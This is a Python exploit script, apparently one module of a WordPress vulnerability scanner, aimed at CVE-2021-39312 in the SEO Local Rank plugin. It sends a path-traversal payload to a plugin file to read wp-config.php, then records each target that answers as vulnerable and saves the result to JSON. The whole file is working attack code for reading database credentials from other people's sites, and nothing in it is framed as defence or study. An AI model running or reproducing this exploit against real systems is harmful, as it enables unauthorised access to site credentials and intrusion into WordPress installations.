import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url, payload=None):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:
        x = "{}/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php".format(
            url)
        PAYLOAD = "../../../../../../../../wp-config.php"
        payload = "/scripts/simple.php/{}".format(PAYLOAD)
        _response = req.post(x, data={'src': payload})
        if _response.status_code == 200:
            print(colors.yellow + "[+] ==> CVE-2021-39312 %s Vulnerable" % url)

            found.append({
                "url":
                url,
                "payload":
                payload,
                "status":
                _response.status_code,
                "exploit":
                "CVE-2021-39312",
                "vuln":
                "WordPress Plugin SEO Local Rank <= 1.0.1 - Remote File Inclusion"
            })
            json_me(url, "CVE-2021-39312", found)
        else:
            print(colors.red +
                  "[-] CVE-2021-39312 ==> %s Not Vulnerable" % url)

    except Exception as e:
        print(e)

        pass
